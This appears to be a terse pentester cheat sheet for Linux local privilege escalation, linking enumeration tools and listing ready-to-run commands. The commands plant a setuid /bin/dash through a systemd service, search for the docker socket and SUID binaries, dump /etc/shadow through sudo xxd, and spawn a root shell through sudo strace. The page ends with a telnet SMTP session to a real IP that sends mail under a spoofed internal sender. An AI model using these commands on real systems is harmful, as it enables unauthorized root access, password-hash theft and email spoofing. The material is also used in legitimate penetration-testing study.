# LPE Linux

## Tools 

{% embed url="https://github.com/diego-treitos/linux-smart-enumeration" %}

{% embed url="https://github.com/rebootuser/LinEnum" %}

```text
lse.sh
LinEnum.sh
LinPeas
```

## Systemd

```text
echo -e '#!/bin/bash\nchmod 4755 /bin/dash' > /tmp/priv.sh 
vi /lib/systemd/system/debug.service 
edit line : ExecStart in `/tmp/priv.sh
reboot
```

## Programms running

```text
ps -aux | grep root
https://github.com/DominicBreuker/pspy 
```

## Docker

```text
find / -group docker -exec ls -la {} 2>/dev/null \;
=> on cherche le docker.sock
```

## Binaries enum

```text
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```

## Hash dump

```text
sudo xxd /etc/shadow | xxd -r
```

## Strace root

```text
sudo strace -o /dev/null /bin/sh
```

## SMTP Try to send email from server

```text
`telnet 90.84.191.81 25`
`EHLO YOLO`
`MAIL FROM:n.deligny@<domain>`
#250 2.1.0 Sender OK
`RCPT TO: a.camus@<domain>`
#250 2.1.5 Recipient OK
`DATA`
#354 Start mail input; end with <CRLF>.<CRLF>
`Subject: test message`
`This is the body of the message!`
`.`
#250 2.6.0 <4ced9105c9f84d78b7ff5b3e6304b1a6@<domain>> [InternalId=110870285778966, Hostname=<domain>] Queued mail for delivery
` quit`

```

\`\`

